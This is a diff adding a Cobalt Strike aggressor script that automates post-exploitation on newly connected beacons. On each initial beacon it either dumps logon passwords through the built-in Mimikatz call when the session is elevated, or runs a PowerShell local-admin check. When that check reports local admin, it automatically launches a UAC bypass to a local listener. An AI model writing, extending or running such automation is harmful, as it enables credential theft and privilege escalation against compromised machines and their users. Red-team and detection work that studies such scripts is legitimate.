@@ -1,0 +1,53 @@
+ # @Killswitch-GUI
+ # This script will Auto check for LocalAdmin User on intial agent 
+
+ # quickly run powershellimport
+sub powershellimport {
+  bpowershell_import($1, script_resource("CheckLAdminContext.ps1"));
+}
+
+alias checkla {
+  powershellimport($1);
+  bpowershell($1, 'Invoke-LocalAdminCheck');
+}
+
+# register the checkla command
+beacon_command_register(
+  "checkla", 
+  "Checks if the current user is in a Local-Admin Context", 
+  "Synopsis: checkla [no arguments]\n\nChecks using Powershell that supports (2.0 or later with 3.5 .NET) \n or (PS 4.0 or later) to perform a local admin check of current user.");
+
+  # set up the Initial check
+on beacon_initial {
+  $a = binfo($1, "user");
+  $b = "*";
+  if ($b isin $a)
+    {
+    blogonpasswords($1);
+    beacon_note($1, "Elevated Context: Ran LogonPasswords");
+    }
+  else
+    {
+    powershellimport($1);
+    bpowershell($1, 'Invoke-LocalAdminCheck -Initial True');
+    }
+}
+
+on beacon_output {
+  $s = replace($2, 'received output:\n'.'');
+  # println($s);
+  $f = "[!] Agent-Started-in-LocalAdmin";
+  if ($f isin $s)
+    {
+    $pid = binfo($1, "pid");
+    elog("Initial Beacon is LocalAdmin at: $pid");
+    # beacon_note($1, "Elevated Context: Ran Logon");
+    $lis = listeners_local();
+    bbypassuac($1, $lis[0]);
+    }
+}
+
+# All intial beacons run script
+# event triggers on output
+# if it matches known string it executes logic
+# if intial matches a * in name it executes logic
